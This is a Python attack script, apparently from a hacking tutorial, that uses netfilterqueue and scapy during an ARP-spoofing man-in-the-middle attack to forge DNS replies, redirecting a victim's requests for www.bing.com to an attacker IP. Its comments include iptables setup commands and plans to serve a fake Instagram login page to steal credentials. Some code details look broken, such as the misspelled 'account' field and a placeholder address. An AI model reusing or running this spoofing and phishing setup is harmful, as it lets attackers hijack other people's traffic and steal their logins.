#! /usr/bin/env python

#we will modify the requests we will receive from the target before ot is sent to the router
# refer https://drive.google.com/drive/u/0/folders/1wPC9GeJlFAbXUTtwEaFUxiVe6Yy7GmqZ if problem persists
#on cli > iptables -I FORWARD -j NFQUEUE --queue-num 0
# FORWARD is used only when requests is coming from other computer
# OUTPUT is used only when requests is coming from same computer
# INPUT is used only when requests is coming from same computer
# so use that on cli command 2 times first on input then on output with same --queue-num 0

#u will need a package called netfilterqueue
#on cli > pip install netfilterqueue
# run arp_spoof to be Man in middle

import netfilterqueue
import scapy.all as scapy


def packet_process(packet):
    scapy_pack = scapy.IP(packet.get_payload())
    print(scapy_pack.show())
    if scapy_pack.haslayer(scapy.DNSRR):# to convert the packet as  a scapy packet
        qname = scapy_pack[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="ip to be redirected to")
            scapy_pack[scapy.DNS].an = answer
            # u might 3-4 answers but we are only sending it once..this is because it has been preset in the accounts feild the
            # answer will be sent4 times..
            # we will modify that so that the machine is fooled to think that it was onluy menat to be sent once
            scapy_pack[scapy.DNS].account = 1
            # now there is len ans chksum field that is added to ensure that packet has not been modified
            # we will delete these fields and scapy will add these on its own based on the len of packet we send
            # we just need to delete them
            del scapy_pack[scapy.IP].len
            del scapy_pack[scapy.IP].chksum
            del scapy_pack[scapy.UDP].chksum
            del scapy_pack[scapy.UDP].len
            packet.set_payload(str(scapy_pack))
        print(packet.get_payload()) # to see whats inside the packet
    #print(packet) # it will only give output like TCP 40 bytes

    packet.accept()
    # packet.drop() # to cut someone's internet connection simply drop the packets
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, packet_process) # 0 is the number we gave as --queue-num
queue.run()

# makesure to delete the iptables we made at the start
# cli > iptables --flush



# after doing all this we can run our own kali server by doing service apache2 start and modify our index.html page
# look like instagram page. now our ip will be used and our page will be served when someone wants to goto insta and ww will
# ask for login credentials

#todo ~echo 1 > /proc/sys/net/ipv4/ip_forward to allow kali forward the requests